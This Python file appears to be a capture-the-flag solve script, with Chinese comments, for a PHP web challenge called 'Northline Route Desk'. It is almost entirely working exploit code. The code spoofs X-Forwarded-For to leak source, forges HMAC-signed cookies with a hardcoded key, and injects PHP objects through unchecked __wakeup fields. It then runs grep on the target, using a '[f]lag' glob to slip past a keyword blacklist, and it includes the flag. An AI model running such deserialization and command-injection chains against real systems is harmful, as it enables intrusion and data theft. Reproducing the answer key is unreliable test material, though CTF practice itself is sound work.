#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
solve.py — 环节三 web04「Northline Route Desk」：自研序列化协议 + PHP 对象注入 + 命令注入

qid : agx_XF9JxuV545mS    分值: 500    分类: web
题目 description: （平台 description 为空）
flag: flag{6a414b5e-897a-40c6-9925-26ad77b5d092}

利用链（6 条考点，见 README §3）
--------------------------------
① 源码泄露：`GET /?audit=1` + `X-Forwarded-For: 127.0.0.1` 通过 request_says_loopback()，
   回显 highlight_file(__FILE__) 的 93KB 高亮源码 → 拿到全部密钥与 gadget。
   ⚠️ 一次性资源：比赛期间实测该请求会把容器打崩。
② 自研胶囊协议 LedgerCodec：
       frame = base64(gzcompress($payload, 9))，再做 rtrim('=') 与 '+/' → '._' 替换
       tag   = substr(hash_hmac('sha384', frame, MATERIAL), 11, 32)
       ticket= frame + '~' + tag            → 放进 cookie RAVEL_LEDGER
   还需要请求头 `X-RAVEL-PHASE: replay`（否则只提示 "replay phase is not enabled"）。
③ HMAC 密钥硬编码在源码里：MATERIAL = 'ravel::ledger::2026::7c2a0e49b5'。
④ LedgerJob::__wakeup() 只重置不合规的 rule / courier，**漏了 node / marker / primed**
   → 这三个字段可以随意污染（node='127.0.0.1'、marker='ledger-route:slot-8'、primed=true）。
⑤ CourierEngine::$proof 是**公开算法可自算**的：
       sha256(COIL . '#' . routeName . '#' . launcher . '#' . implode("\\x1e", args))[5:31]
   COIL = 'courier-engine::ravel::route-lock'
⑥ 命令注入绕过：
   · 黑名单只把 launcher + arguments join 起来查（$rawRoute），**不含 $node**
   · 用 `stripos` 做**子串**匹配 → 'flag'/'proc' 会被命中
   · 但 shell 里 `[f]lag` 是 glob，展开后等于 'flag' ⇒ 用正则写法同时绕过
     "含 flag/proc" 检测 与 字面量匹配
   最终：launcher=/usr/bin/grep, args=['-r','-I','-m1'] + EXCLUDE + ['[f]lag','/']

用法
----
    # 1) 泄露源码存档（只打一次！）
    python solve.py --target http://127.0.0.1:9999 --leak-source

    # 2) 直接 RCE 取 flag
    python solve.py --target http://127.0.0.1:9999

    # 3) 比赛原始地址（会随 reset 变化）
    python solve.py --target https://eci-2ze6xkwkd3bq8xtkkyb1.cloudeci1.ichunqiu.com:9999
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import os
import re
import sys
import zlib

import requests
import urllib3

urllib3.disable_warnings()
try:
    sys.stdout.reconfigure(encoding='utf-8')
except Exception:
    pass

COMPETITION_TARGET = ('https://eci-2ze6xkwkd3bq8xtkkyb1.cloudeci1.ichunqiu.com:9999')
QID = 'agx_XF9JxuV545mS'
FLAG_RE = re.compile(r'flag\{[^}]{1,200}\}')

# ---- 源码里硬编码的常量（考点 ③/⑤）----
MATERIAL = 'ravel::ledger::2026::7c2a0e49b5'
COIL = 'courier-engine::ravel::route-lock'
MARKER = 'ledger-route:slot-8'

EXCLUDE = ['--exclude-dir=[%s]%s' % (d[0], d[1:]) for d in
           ['etc', 'usr', 'var', 'bin', 'sbin', 'lib', 'proc', 'sys', 'dev',
            'run', 'opt', 'home', 'root', 'tmp', 'mnt', 'media', 'srv', 'boot']]


# --------------------------------------------------------------------------
# PHP 序列化构造（private 属性名带 NUL 前缀）
# --------------------------------------------------------------------------
def ps(cls: str, props: dict, order: list) -> str:
    out = f'O:{len(cls)}:"{cls}":{len(order)}:{{'
    for k in order:
        t, v = props[k]
        name = f'\0{cls}\0{k}'
        out += f's:{len(name.encode())}:"{name}";'
        if t == 'b':
            out += f'b:{1 if v else 0};'
        elif t == 'i':
            out += f'i:{v};'
        elif t == 's':
            out += f's:{len(v.encode())}:"{v}";'
        elif t == 'o':
            out += v
        elif t == 'a':
            out += f'a:{len(v)}:{{'
            for i, x in enumerate(v):
                out += f'i:{i};s:{len(str(x).encode())}:"{x}";'
            out += '}'
    return out + '}'


def make_proof(route: str, launcher: str, args: list) -> str:
    """考点 ⑤：proof 完全可自算"""
    route_str = route + '#' + launcher + '#' + '\x1e'.join(str(a) for a in args)
    return hashlib.sha256((COIL + '#' + route_str).encode()).hexdigest()[5:5 + 26]


def build_job(launcher: str, args: list, route: str = 'echo-probe',
              window: int = 4, node: str = '127.0.0.1') -> str:
    """构造 LedgerJob 胶囊：污染 primed/marker/rule/courier/node（考点 ④）"""
    proof = make_proof(route, launcher, args)

    courier = ps('CourierEngine', {
        'routeName': ('s', route), 'launcher': ('s', launcher),
        'arguments': ('a', args), 'window': ('i', window), 'proof': ('s', proof),
    }, ['routeName', 'launcher', 'arguments', 'window', 'proof'])

    rule = ps('LoopbackRule', {
        'expression': ('s', r'/^(::1|127(?:\.[0-9]{1,3}){3})$/i'),
        'strategy': ('s', 'regexp'),
    }, ['expression', 'strategy'])

    return ps('LedgerJob', {
        'primed': ('b', True), 'marker': ('s', MARKER),
        'rule': ('o', rule), 'courier': ('o', courier), 'node': ('s', node),
    }, ['primed', 'marker', 'rule', 'courier', 'node'])


def wrap(payload: str) -> str:
    """考点 ②：复刻 LedgerCodec::wrap()"""
    frame = base64.b64encode(zlib.compress(payload.encode(), 9)).decode()
    frame = frame.rstrip('=').replace('+', '.').replace('/', '_')
    tag = hmac.new(MATERIAL.encode(), frame.encode(), hashlib.sha384).hexdigest()[11:11 + 32]
    return frame + '~' + tag


# --------------------------------------------------------------------------
def leak_source(base: str, verbose: bool = True) -> bytes | None:
    """考点 ①：/?audit=1 + X-Forwarded-For: 127.0.0.1 → highlight_file(__FILE__)

    ⚠️ 一次性资源：比赛期间实测会打崩容器。只调用一次。
    """
    s = requests.Session()
    s.trust_env = False
    try:
        r = s.get(base.rstrip('/') + '/', params={'audit': '1'},
                  headers={'X-Forwarded-For': '127.0.0.1'}, timeout=60, verify=False)
    except Exception as e:
        if verbose:
            print(f'[!] audit 请求失败 {type(e).__name__}: {e}')
        return None
    if verbose:
        print(f'[*] GET /?audit=1 (XFF: 127.0.0.1) -> {r.status_code} '
              f'len={len(r.content)} ctype={r.headers.get("Content-Type")}')
    if r.status_code == 200 and len(r.content) > 5000:
        out = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'audit_source.html')
        open(out, 'wb').write(r.content)
        if verbose:
            print(f'[+] 源码已存档 {out}')
        return r.content
    return None


def fire(base: str, launcher: str, args: list, label: str, verbose: bool = True,
         timeout: int = 60):
    """把 job 胶囊塞进 cookie RAVEL_LEDGER，附带 X-RAVEL-PHASE: replay"""
    payload = build_job(launcher, args)
    ticket = wrap(payload)
    s = requests.Session()
    s.trust_env = False
    try:
        r = s.get(base.rstrip('/') + '/',
                  headers={'X-RAVEL-PHASE': 'replay', 'Cookie': 'RAVEL_LEDGER=' + ticket},
                  timeout=timeout, verify=False)
    except Exception as e:
        if verbose:
            print(f'  [{label}] ERR {type(e).__name__}: {e}')
        return None, ''
    body = r.text
    if verbose:
        print(f'  [{label}] {r.status_code} len={len(body)}')
    return r.status_code, body


def solve(target: str, verbose: bool = True, do_leak: bool = False) -> dict:
    target = target.rstrip('/')
    res: dict = {'target': target, 'flag': None, 'via': None, 'attempts': [],
                 'source_leaked': False}

    def log(m):
        if verbose:
            print(m, flush=True)

    log(f'[*] target = {target}')

    # 0) 基线：确认站点活着
    s = requests.Session()
    s.trust_env = False
    try:
        r0 = s.get(target + '/', timeout=15, verify=False)
        log(f'[*] baseline / -> {r0.status_code} len={len(r0.content)}')
    except Exception as e:
        log(f'[!] 目标不可达: {type(e).__name__}: {e}')
        return res

    # 1) 可选：泄露源码
    if do_leak:
        log('\n=== 1) 源码泄露 /?audit=1 + X-Forwarded-For: 127.0.0.1（一次性资源）===')
        data = leak_source(target, verbose)
        res['source_leaked'] = bool(data)

    # 2) RCE：grep 全盘找 flag（考点 ⑥ 的最终形态）
    log('\n=== 2) 命令注入：grep -r 扫根目录找 flag（[f]lag 绕过 stripos 子串检查）===')
    attempts = [
        ('grep-root', '/usr/bin/grep', ['-r', '-I', '-m1'] + EXCLUDE + ['[f]lag', '/']),
        ('grep-all', '/usr/bin/grep',
         ['-r', '-I', '-m1', '--exclude-dir=[p]roc', '--exclude-dir=[s]ys', '[f]lag', '/']),
        ('find-root', '/usr/bin/find', ['/', '-maxdepth', '1', '-type', 'f']),
    ]
    for label, launcher, args in attempts:
        code, body = fire(target, launcher, args, label, verbose)
        if code is None:
            continue
        m = FLAG_RE.search(body)
        res['attempts'].append({'label': label, 'status': code, 'flag':
                                m.group(0) if m else None})
        # 打印 <pre> 区块回显（Manual/Replay Channel），便于留证
        pres = re.findall(r'<pre>(.*?)</pre>', body, re.S)
        if verbose:
            for i, seg in enumerate(pres):
                seg = (seg.replace('&lt;', '<').replace('&gt;', '>')
                          .replace('&amp;', '&').replace('&quot;', '"')
                          .replace('&#039;', "'"))
                print(f'   --- <pre>#{i} ---')
                print('   ' + seg.strip()[:1500].replace('\n', '\n   '))
        if m:
            res['flag'] = m.group(0)
            res['via'] = f'RCE: {launcher} {" ".join(args)}'
            return res

    return res


def main() -> int:
    ap = argparse.ArgumentParser(description='环节三 web04 · Northline Route Desk')
    ap.add_argument('--target', '-t', default=COMPETITION_TARGET)
    ap.add_argument('--leak-source', action='store_true',
                    help='先打 /?audit=1 泄露源码（⚠️ 可能打崩容器，只打一次）')
    ap.add_argument('--submit', action='store_true', help='取到 flag 后提交平台')
    ap.add_argument('--json', action='store_true')
    args = ap.parse_args()

    res = solve(args.target, verbose=not args.json, do_leak=args.leak_source)
    if args.json:
        print(json.dumps(res, ensure_ascii=False, indent=2))
    elif res['flag']:
        print(f"\n[+] FLAG = {res['flag']}")
        print(f"[+] 取得方式: {res['via']}")
    else:
        print('\n[-] 未取到 flag')

    if args.submit and res['flag']:
        sys.path.insert(0, r'D:\2026\湾区杯\决赛')
        try:
            import agent_api as A
            print('[SUBMIT]', A.api_submit(A.load_token(), QID, res['flag']))
        except Exception as e:
            print('[!] 提交失败:', e)
    return 0 if res['flag'] else 1


if __name__ == '__main__':
    sys.exit(main())
